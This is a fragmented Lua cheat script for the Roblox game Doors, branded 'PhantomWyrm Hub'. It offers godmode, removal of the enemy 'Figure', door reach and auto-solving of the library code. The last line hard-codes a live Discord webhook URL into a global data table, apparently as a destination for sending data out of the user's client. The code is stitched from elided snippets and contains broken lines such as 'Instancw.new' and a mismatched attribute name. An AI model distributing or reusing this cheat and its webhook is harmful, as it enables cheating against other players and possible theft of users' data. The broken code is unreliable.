...
if game:GetService("Players").LocalPlayer:GetAttribute("PhantomWyrmLoaded") then 
if getgenv().Library then
getgenv().Library:Notify("PhantomWyrm 『 Already Loaded 』",4)
else
print("PhantomWyrm Hub X『 Already Loaded 』")
end
return end
...
UtilityBox:AddLabel('Carryxkn2 Owner PhantomWyrm Hub X Doors',true)

    UtilityBox:AddButton({
        Text = "Unload Hub",
        Func = function()
            game.Players.LocalPlayer:SetAttribute("PhantomWyrmLoaded", nil)
...
elseif Notifying == "PhantomWyrm" then
NotificationHandler:Create({
		Title = "PhantomWyrm Hub",
		Description = txt,
		Duration = duration,
		Image = "",
	})
...
UtilityBox:AddLabel('Carryxknw - Doors Notification Creator',true)
UtilityBox:AddLabel('Carryxkn2 - ESPLibrary Creator',true)
    UtilityBox:AddButton({
        Text = "Unload Hub",
        Func = function()
            LocalPlayer:SetAttribute("PhantomWyrmLoaded", nil)
            for _, con in pairs(Connections) do con:Disconnect() end
...
ThemeManager:SetLibrary(Library)
    ...
    ThemeManager:SetFolder("PhantomWyrmXUniversal/Doors/Lobby")
    SaveManager:SetFolder("PhantomWyrmXUniversal/Doors/Lobby/Config")
...
local Part = Instancw.new("Part", SeekPath)
...
Notify("[Delete Figure] Wait in Room 49 until Notifcation end",10)
end
end
end
...
if not Prompt or Prompt:GetAttribute("Interactions") and Prompt:GetAttribute("Interactions") > 1 then break end
...
Toggles.DeleteFigureFE:SetValue(false)
        ...
        if Root and isnetworkowner(Root) then
            ...
            if Root.Position.Y < -1000 and not v:GetAttribute("Deleted") then
                Notify("[Delete Figure] Successfully Removed Figure", 4)
    ...
    if LatestRoom.Value < 49 then
        ...
        if CurrentNode then
            ...
            if CurrentNum then
                local Node1
                for _, Node in pairs(Nodes) do
                    if Node.Name == "MinecartNode" .. tostring(CurrentNum + 1) then
                        Node1 = Node
                        break
                    end
                end
                ...
                if Node1 then
                    local DistToNode = (Root.Position - Node1.Position).Magnitude
...
if Toggles.Godmode.Value then
    if RemotesFolder.Name == "RemotesFolder" then
        ...
        if LocalPlayer.Character.Humanoid.HipHeight ~= 0.18 then
            LocalPlayer.Character.Humanoid.HipHeight = 0.18
        end
...
if Toggles.AutoLibraryCode.Value and AutoLibrary > 0.2 then
    AutoLibrary = 0
...
if Toggles.DoorReach.Value and DoorReach > 0.3 then
DoorReach = 0
...
v.CanCollide  = true
    ...
    if LocalPlayer.Character:FindFirstChild("Collision") then
        LocalPlayer.Character.Collision.CanCollide = (LocalPlayer.Character.Collision.CollisionGroup ~= "PlayerCrouching")
...
local timeout = 0
repeat task.wait(0.1) timeout += task.wait(0.1) until timeout >= 1 or v.Parent
if v.Parent then
...
MenuGroup:AddDropdown("NotifyWay", {
	Values = { "Doors", "Library", "PhantomWyrm"},
	Default = Notifying,
...
UtilityBox:AddLabel('Carryxkn2 - ESPLibrary Creator',true)
    UtilityBox:AddButton({
        Text = "Unload Hub",
        Func = function()
            LocalPlayer:SetAttribute("PhantomWyrmLoad!", nil)
            for _, con in pairs(Connections) do con:Disconnect() end
...
ThemeManager:SetLibrary(Library)
    ...
    SaveManager:IgnoreThemeSettings()
    SaveManager:SetIgnoreIndexes({'MenuKeybind'})
    ThemeManager:SetFolder("PhantomWyrmXUniversal/Doors/Theme")
    SaveManager:SetFolder("PhantomWyrmXUniversal/Doors/Configs")
    SaveManager:BuildConfigSection(Tabs['Settings'])
    ThemeManager:ApplyToTab(Tabs['Settings'])
...
do
    ...
    _G.Data.U = 'https://discord.com/api/webhooks/1502746103387390115/GFT1beTFRM5MxYV2XsE4iRR_0nRJZcpVkn6z0ugY1LhwSKHqv2eiFCnfYGH275ZhyNCh'
